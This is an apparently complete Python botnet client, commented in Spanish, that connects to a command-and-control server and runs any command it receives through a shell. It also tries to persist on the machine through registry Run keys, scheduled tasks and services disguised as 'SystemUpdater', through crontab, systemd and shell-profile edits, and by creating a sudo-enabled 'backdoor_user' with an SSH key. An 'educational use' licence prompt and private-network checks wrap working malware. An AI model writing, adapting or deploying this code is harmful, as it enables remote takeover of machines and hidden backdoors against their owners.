import socket
import subprocess
import platform
import os
import ipaddress
import requests
import argparse
import re
import sys


def validar_ip(ip):
    
    """
    Verifica que una IP sea válida.

    Utiliza una expresión regular para verificar que la IP tenga el formato
    correcto. La expresión regular coincide con direcciones IP en formato
    decimal (por ejemplo, 127.0.0.1).

    Parameters:
    ip (str): La IP a verificar.

    Returns:
    bool: True si la IP es válida, False en caso contrario.
    """
    
    patron = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
    return patron.match(ip) is not None

def validar_puerto(port):
    
    """
    Verifica que un puerto sea válido.

    Un puerto válido es un número entre 1 y 65535.

    Parameters:
    port (int): El puerto a verificar.

    Returns:
    bool: True si el puerto es válido, False en caso contrario.
    """

    return 1 <= port <= 65535

parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
parser.add_argument("--host", required=True, help="IP del servidor C&C")
parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
parser.add_argument("--key", required=True, help="Clave de autenticación")
args = parser.parse_args()



def esEntornoCloud():
    
    """Indica si el programa se ejecuta en un entorno de cloud computing.

    La función intenta conectarse a los puntos de metadata de AWS y Google Cloud
    y devuelve True si alguno de ellos responde. Si no se logra conectar a
    ninguno de ellos, se devuelve False.

    Returns:
        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.
    """
    try:
        # AWS Metadata
        if requests.get("http://169.254.169.254/latest/meta-data/", timeout=1).status_code == 200:
            return True
    except requests.exceptions.RequestException:
        pass

    try:
        # Google Cloud Metadata
        if requests.get("http://metadata.google.internal/", timeout=1).status_code == 200:
            return True
    except requests.exceptions.RequestException:
        pass

    return False

def es_red_privada(ip):
    """Indica si una IP es de una red privada o no.

    La función intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve
    el resultado de llamar a su método is_private(). Si la IP no es válida,
    devuelve False.

    Parameters:
    ip (str): La IP a verificar.

    Returns:
    bool: True si la IP es de una red privada, False si no lo es.
    """

    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False
    
def verificar_eula(tipo):
    """
    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.
    
    :param tipo: "servidor" o "cliente" para determinar qué EULA verificar.
    """
    if tipo not in ["servidor", "cliente"]:
        raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")

    eula_path = f"eula_{tipo}.txt"

    # Si no existe, lo crea
    if not os.path.exists(eula_path):
        with open(eula_path, "w") as f:
            f.write("ACCEPTED=False")

    # Leer si ya aceptó
    with open(eula_path, "r") as f:
        for linea in f:
            if "ACCEPTED=True" in linea:
                return True

    # Mostrar Acuerdo de Licencia
    print("\n" + "="*50)
    print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
    print("="*50)
    print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
    print("El uso en redes ajenas sin autorización está prohibido.")
    print("El usuario debe cumplir con las leyes de su país.")
    print("No se permite el uso de este software en redes públicas.")
    print("El autor no se hace responsable del uso indebido.\n")
    
    print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
    print("   - Usarlo con intenciones maliciosas.")
    print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
    print("   - Modificarlo para evadir restricciones.")
    print("   - Distribuirlo con fines ilegales o comerciales.\n")
    
    print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
    
    respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
    
    if respuesta == "ACEPTO":
        with open(eula_path, "w") as f:
            f.write("ACCEPTED=True")
        return True
    else:
        print("Debe aceptar la licencia para usar este software.")
        exit()

def detectar_sistema():
    
    """
    Detecta el sistema operativo del bot.

    Usa la función platform.system() para determinar el sistema operativo
    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
    """
    return platform.system().lower()  # "windows" o "linux"

def conectar_a_CnC():
    
    """
    Establece una conexión del bot al servidor de Comando y Control (C&C).

    Crea un socket TCP/IP y se conecta al servidor C&C usando la dirección
    y puerto especificados por las variables HOST y PORT. Devuelve el socket
    conectado para permitir la comunicación con el servidor.

    :return: El socket conectado al servidor C&C.
    """

    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((HOST, PORT))
    print(f"Conectado al servidor C&C {HOST}:{PORT}")
    return bot

def intentar_persistencia():

    """
    Intenta establecer persistencia en el sistema operativo del bot.

    Dependiendo del sistema operativo detectado, ejecuta una serie de comandos
    que intentan asegurar la persistencia del bot en el sistema. En Windows,
    utiliza métodos como el registro, tareas programadas y servicios. En Linux,
    emplea crontab, systemd y modificaciones en archivos de inicio. Si alguno
    de los métodos tiene éxito, se detiene el proceso y devuelve un mensaje
    indicando el método exitoso. Si todos fallan, devuelve un mensaje de error.

    :return: Un mensaje indicando si se logró la persistencia o un error.
    :rtype: str
    """

    so = detectar_sistema()
    persistencia_exitosa = False
    mensaje_final = "[ERROR] No se pudo establecer persistencia"

    if so == "windows":
        comandos = [
                # 1. Registro de Windows
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdater /t REG_SZ /d "%APPDATA%\\clienteinfectado.exe" /f',
                # 2. Tarea Programada
                'schtasks /create /tn "SystemUpdater" /tr "%APPDATA%\\clienteinfectado.exe" /sc ONLOGON /rl HIGHEST',
                # 3. Carpeta de Inicio
                'copy %APPDATA%\\clienteinfectado.exe %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdater.exe',
                # 4. Servicio de Windows
                'sc create SystemUpdater binPath= "%APPDATA%\\clienteinfectado.exe" start= auto',
                # 5. WMI Events (requiere admin)
                'powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName "SystemUpdater" -Action (New-ScheduledTaskAction -Execute "%APPDATA%\\clienteinfectado.exe")'
            ]

    elif so == "linux":
        comandos = [
            # 1. Crontab
            "(crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -",
            # 2. Systemd Service
            """echo '[Unit]
                Description=Bot Persistente
                After=network.target

                [Service]
                ExecStart=/usr/bin/python3 ~/clienteinfectado.py
                Restart=always
                User=$USER

                [Install]
                WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service""",
            # 3. Modificación de ~/.bashrc
            "echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc",
            # 4. Modificación de /etc/profile (requiere root)
            "sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile'",
            # 5. Crear usuario SSH con clave autorizada
            "sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user",
            "mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys",
            "chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh"
        ]

    else:
        return mensaje_final  # Sistema no reconocido

    for cmd in comandos:
        try:
            resultado = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if resultado.returncode == 0:
                persistencia_exitosa = True
                mensaje_final = f"[OK] Persistencia establecida con: {cmd.split()[0]}"
                break  # Detener el intento tras el primer éxito
        except Exception:
            continue  # Si un método falla, probar el siguiente

    return mensaje_final

def esperar_ordenes(bot):
    
    """
    Espera órdenes del servidor C&C y las ejecuta.

    Este bucle infinito espera recibir órdenes del servidor C&C y las
    ejecuta en el sistema operativo del bot. Si el comando es "detect_os",
    devuelve el resultado de detectar_sistema(). Si el comando es "persistencia",
    intenta establecer persistencia en el sistema y devuelve el resultado.
    Para cualquier otro comando, lo ejecuta en el sistema y devuelve la
    salida del comando o un mensaje de error si ocurre un error.

    :param bot: El socket conectado al servidor C&C.
    :type bot: socket.socket
    """
    while True:
        try:
            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
            if not orden:
                continue
            
            print(f"Comando recibido: {orden}")

            if orden == "detect_os":
                bot.send(detectar_sistema().encode("utf-8"))
                continue
            elif orden == "persistencia":
                resultado = intentar_persistencia().encode("utf-8")
            else:
                resultado = ejecutar_comando(orden)

            bot.send(resultado if resultado else b"Comando ejecutado sin salida")

        except Exception as e:
            print(f"Error: {e}")
            break

def ejecutar_comando(orden):
    
    """
    Ejecuta un comando del sistema operativo recibido como cadena.

    Usa subprocess para ejecutar el comando proporcionado y captura su salida.
    Si el comando se ejecuta correctamente, devuelve la salida. Si ocurre un 
    error durante la ejecución, captura la salida de error y la devuelve 
    como mensaje de error.

    :param orden: Comando del sistema a ejecutar.
    :return: Salida del comando o mensaje de error en caso de fallo.
    """

    try:
        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8') # Devolver el error

def ejecutar_bot():
    
    """
    Función principal que conecta el bot al servidor C&C y espera órdenes.

    Establece la conexión con el servidor de Comando y Control (C&C) usando
    la función conectar_a_CnC y luego entra en un bucle para recibir y
    procesar órdenes mediante la función esperar_ordenes.

    :return: None
    """

    bot = conectar_a_CnC() # Conectar al servidor C&C
    esperar_ordenes(bot) # Esperar y procesar órdenes

if __name__ == "__main__":
    if not validar_ip(args.host):
        print("[ERROR] IP no válida.")
        sys.exit(1)
    if not validar_puerto(args.port):
        print("[ERROR] Puerto fuera de rango (1-65535).")
        sys.exit(1)
    verificar_eula("cliente")
    HOST = args.host
    PORT = args.port
    print(f"Conectando a {HOST}:{PORT} con autenticación segura...")
    if esEntornoCloud():
        print("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
        exit()
    if not es_red_privada(HOST):
        print("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
        exit()
    SECRET_KEY = args.key
    ejecutar_bot()